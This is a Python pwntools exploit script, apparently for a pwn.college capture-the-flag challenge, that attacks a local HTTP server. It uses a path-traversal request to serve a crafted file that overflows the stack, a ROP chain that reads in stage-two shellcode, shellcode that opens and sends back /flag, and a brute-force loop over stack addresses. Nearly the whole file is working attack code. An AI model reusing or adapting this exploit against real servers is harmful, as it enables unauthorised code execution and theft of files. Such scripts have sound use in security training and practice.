#!/usr/bin/env python3
"""v4: Fixed stack alignment + diagnostic marker"""
from pwn import *
context.arch = "amd64"
context.log_level = "warn"
import os, sys, time

H1 = b"HTTP/1.1 200 OK\nServer: pwnserver/1.33333333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: "
CT = b"text/plain\n"; FS = 8180
hs = len(H1) + len(CT) + len(b"Content-Length: " + str(FS).encode() + b"\n") + 1
RBP_OFF = 8200 - hs; RET_OFF = 8208 - hs

POP_RDI = 0x401E73
POP_RSI_R15 = 0x401E71
RET = 0x40101A        # alignment gadget
READ_PLT = 0x401230
BSS = 0x404800

# Stage 2: open/read/write /flag
STAGE2 = asm("""
    xor eax,eax; push rax
    movabs rax,0x67616c662f; push rax
    mov rdi,rsp; xor eax,eax; mov al,2; xor esi,esi; syscall
    test rax,rax; js done
    mov edi,eax; xor eax,eax
    mov esi,0x404900; mov edx,200; syscall
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    mov esi,0x404900; syscall
done:
    xor edi,edi; mov eax,60; syscall
""")

def build(addr):
    p = bytearray(FS)
    p[RBP_OFF:RBP_OFF+8] = p64(addr + 8200)  # saved_rbp self-ref

    off = RET_OFF
    p[off:off+8] = p64(POP_RDI);      off += 8  # pop rdi; ret
    p[off:off+8] = p64(4);            off += 8  # rdi = client fd
    p[off:off+8] = p64(POP_RSI_R15);  off += 8  # pop rsi; pop r15; ret
    p[off:off+8] = p64(BSS);          off += 8  # rsi = bss
    p[off:off+8] = p64(0);            off += 8  # r15 = junk
    p[off:off+8] = p64(RET);          off += 8  # alignment fix (extra ret)
    p[off:off+8] = p64(READ_PLT);     off += 8  # read(4, BSS, rdx)
    p[off:off+8] = p64(BSS + 8);      off += 8  # pivot to stage2
    return bytes(p)

def req(path, t=5):
    try:
        s=remote("127.0.0.1",80,timeout=t)
        s.send(f"GET /{path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
        d=s.recvall(timeout=t); s.close()
        return d
    except: return None

# Quick test: try GDB address with alignment fix
print("[*] Quick test with CONTENT=0x7ffff7f7d580")
payload = build(0x7FFFF7F7D580)
open("/tmp/pwn","wb").write(payload)

try:
    s = remote("127.0.0.1", 80, timeout=5)
    s.send(b"GET /../../../tmp/pwn HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
    time.sleep(0.3)
    # Send stage2
    s.send(b"\x00" * 8 + STAGE2)
    r = s.recvall(timeout=5)
    s.close()
    print(f"Response: {len(r)} bytes")
    if b"pwn.college{" in r:
        i=r.find(b"pwn.college{"); j=r.find(b"}",i)
        print(f"[FLAG] {r[i:j+1].decode()}")
    else:
        # Check raw response for anything
        bs = r.find(b"\n\n") + 2
        body = r[bs:]
        print(f"Body: {len(body)} bytes, preview: {body[:100]}")
except Exception as e:
    print(f"Error: {e}")

# If quick test failed, do targeted brute force around GDB address
print("\n[*] Brute force ±0x40000 around GDB addr...")
for offset in range(-0x40000, 0x40000, 0x1000):
    addr = 0x7FFFF7F7D580 + offset
    payload = build(addr)
    open("/tmp/pwn","wb").write(payload)
    try:
        s = remote("127.0.0.1", 80, timeout=3)
        s.send(b"GET /../../../tmp/pwn HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
        time.sleep(0.2)
        s.send(b"\x00" * 8 + STAGE2)
        r = s.recvall(timeout=3)
        s.close()
        if b"pwn.college{" in r:
            i=r.find(b"pwn.college{"); j=r.find(b"}",i)
            print(f"\n[+] CONTENT={addr:#018x}")
            print(f"[FLAG] {r[i:j+1].decode()}")
            sys.exit(0)
    except:
        pass
    if offset % 0x8000 == 0:
        print(f"  offset {offset:#08x}...", end=" ", flush=True)

print("\n[-] No hit in range")
